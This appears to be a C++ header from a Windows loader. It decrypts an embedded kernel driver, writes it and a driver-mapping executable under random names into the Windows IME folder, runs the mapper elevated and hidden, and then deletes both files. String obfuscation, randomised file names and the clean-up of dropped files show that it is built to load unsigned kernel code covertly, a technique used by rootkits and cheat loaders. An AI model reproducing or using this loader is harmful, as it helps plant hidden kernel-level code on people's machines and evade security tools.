#pragma once
#include "shellcode.h"
#include "../xor.h"

#define patch_shell   (L"\\SoftwareDistribution\\Download\\")

string random_string()
{
	srand((unsigned int)time(0));
	string str = ("QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890");
	string newstr;
	int pos;
	while (newstr.size() != 32)
	{
		pos = ((rand() % (str.size() + 1)));
		newstr += str.substr(pos, 1);
	}
	return newstr;
}
/*
Mohamed Al-Sharifi
2 Þubat 1996
*/
string random_numb( int len) {

	string tmp_s;
	static const char alphanum[] =
		"0123456789";

	srand((unsigned)time(NULL) * getpid());

	tmp_s.reserve(len);

	for (int i = 0; i < len; ++i)
		tmp_s += alphanum[rand() % (sizeof(alphanum) - 1)];


	return tmp_s;
}

string random_string2( int len) {

	string tmp_s;
	static const char alphanum[] =
		"0123456789"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz";

	srand((unsigned)time(NULL) * getpid());

	tmp_s.reserve(len);

	for (int i = 0; i < len; ++i)
		tmp_s += alphanum[rand() % (sizeof(alphanum) - 1)];


	return tmp_s;
}

wstring random_string_w()
{
	srand((unsigned int)time((0)));
	wstring str = (L"QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890");
	wstring newstr;
	int pos;
	while (newstr.size() != 5)
	{
		pos = ((rand() % (str.size() + 1)));
		newstr += str.substr(pos, 1);
	}
	return newstr;
}

wstring get_parent(const wstring& path)
{
	if (path.empty())
		return path;

	auto idx = path.rfind(L'\\');
	if (idx == path.npos)
		idx = path.rfind(L'/');

	if (idx != path.npos)
		return path.substr(0, idx);
	else
		return path;
}

wstring get_exe_directory()
{
	wchar_t imgName[MAX_PATH] = { 0 };
	DWORD len = ARRAYSIZE(imgName);
	QueryFullProcessImageNameW(GetCurrentProcess(), 0, imgName, &len);
	wstring sz_dir = (wstring(get_parent(imgName)) + (L"\\"));
	return sz_dir;
}

wstring get_files_directory()
{
	WCHAR system_dir[256];
	GetWindowsDirectoryW(system_dir, 256);
	wstring sz_dir = (wstring(system_dir) + wxorstr_(L"\\IME\\"));
	return sz_dir;
}

wstring get_random_file_name_directory(wstring type_file)
{
	wstring sz_file = get_files_directory() + random_string_w() + type_file;
	return sz_file;
}

void run_us_admin(std::wstring sz_exe, bool show)
{
	ShellExecuteW(NULL, wxorstr_(L"runas"), sz_exe.c_str(), NULL, NULL, show);
}

void run_us_admin_and_params(wstring sz_exe, wstring sz_params, bool show)
{
	ShellExecuteW(NULL, wxorstr_(L"runas"), sz_exe.c_str(), sz_params.c_str(), NULL, show);
}

bool drop_mapper(wstring path, LPCVOID memory, int sizela)
{
	HANDLE h_file;
	BOOLEAN b_status = FALSE;
	DWORD byte = 0;

	h_file = CreateFileW(path.c_str(), GENERIC_ALL, NULL, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	if (GetLastError() == ERROR_FILE_EXISTS)
		return true;

	if (h_file == INVALID_HANDLE_VALUE)
		return false;

	b_status = WriteFile(h_file, memory, sizela, &byte, nullptr);
	CloseHandle(h_file);

	if (!b_status)
		return false;

	return true;
}

bool drop_driver(wstring path, LPCVOID memory, int sizela)
{
	HANDLE h_file;
	BOOLEAN b_status = FALSE;
	DWORD byte = 0;

	h_file = CreateFileW(path.c_str(), GENERIC_ALL, NULL, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	if (GetLastError() == ERROR_FILE_EXISTS)
		return true;

	if (h_file == INVALID_HANDLE_VALUE)
		return false;

	b_status = WriteFile(h_file, memory, sizela, &byte, nullptr);
	CloseHandle(h_file);

	if (!b_status)
		return false;

	return true;
}

wstring get_files_path()
{
	WCHAR system_dir[256];
	GetWindowsDirectoryW(system_dir, 256);
	return (wstring(system_dir) + patch_shell);
}

extern bool DecryptAes256File(void* data, int size, const char* save_path);
void mmap_driver()
{

	wstring sz_driver = get_random_file_name_directory(wxorstr_(L".sys"));
	wstring sz_mapper = get_random_file_name_directory(wxorstr_(L".exe"));
	wstring sz_params_map = wxorstr_(L"-map ") + sz_driver;

	DeleteFileW(sz_driver.c_str());
	DeleteFileW(sz_mapper.c_str());

	Sleep(1000);

	if (DecryptAes256File(shell_driver_public, sizeof(shell_driver_public), string(sz_driver.begin(), sz_driver.end()).c_str()))
	{
		//drop_driver(sz_driver, shell_driver_private, 12800);
		drop_mapper(sz_mapper, shell_mapper, 266752);
		//printf("%ws\n", sz_driver.c_str());
		//Sleep(-1);
		run_us_admin_and_params(sz_mapper, sz_params_map, false);
		Sleep(6000);

		DeleteFileW(sz_driver.c_str());
		DeleteFileW(sz_mapper.c_str());
	}
}